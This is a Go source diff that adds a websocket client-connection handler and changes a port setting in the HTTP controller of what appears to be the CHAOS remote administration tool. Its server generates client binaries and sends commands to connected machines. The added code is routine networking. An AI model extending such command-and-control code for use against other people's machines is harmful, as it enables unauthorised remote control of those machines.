@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"github.com/gin-gonic/gin"
 	"github.com/gin-gonic/gin/binding"
+	"github.com/gorilla/websocket"
 	"github.com/sirupsen/logrus"
 	"github.com/tiagorlampert/CHAOS/entities"
 	"github.com/tiagorlampert/CHAOS/internal"
@@ -23,6 +24,11 @@ import (
 	"strings"
 	"time"
 )
+
+var upgrader = websocket.Upgrader{
+	ReadBufferSize:  1024,
+	WriteBufferSize: 1024,
+}
 
 func (h *httpController) noRouteHandler(c *gin.Context) {
 	c.Redirect(http.StatusMovedPermanently, "/")
@@ -191,7 +197,7 @@ func (h *httpController) sendCommandHandler(c *gin.Context) {
 func (h *httpController) generateBinaryGetHandler(c *gin.Context) {
 	c.HTML(http.StatusOK, "generate.html", gin.H{
 		"Address":  network.GetLocalIP(),
-		"Port":     strings.ReplaceAll(h.Configuration.Server.WebSocketPort, ":", ""),
+		"Port":     strings.ReplaceAll(h.Configuration.Server.Port, ":", ""),
 		"OSTarget": system.OSTargetMap,
 	})
 	return
@@ -335,4 +341,24 @@ func (h *httpController) openUrlHandler(c *gin.Context) {
 	}
 	c.Status(http.StatusOK)
 	return
+}
+
+func (h *httpController) clientHandler(c *gin.Context) {
+	clientID := c.GetHeader("x-client")
+
+	ws, err := upgrader.Upgrade(c.Writer, c.Request, nil)
+	if err != nil {
+		h.Logger.Println("error connecting client:", err)
+		c.String(http.StatusInternalServerError, err.Error())
+		return
+	}
+
+	err = h.ClientService.AddConnection(clientID, ws)
+	if err != nil {
+		h.Logger.Println("error adding client:", err)
+		c.String(http.StatusInternalServerError, err.Error())
+		return
+	}
+
+	h.Logger.Println("Client connected: ", clientID)
 }
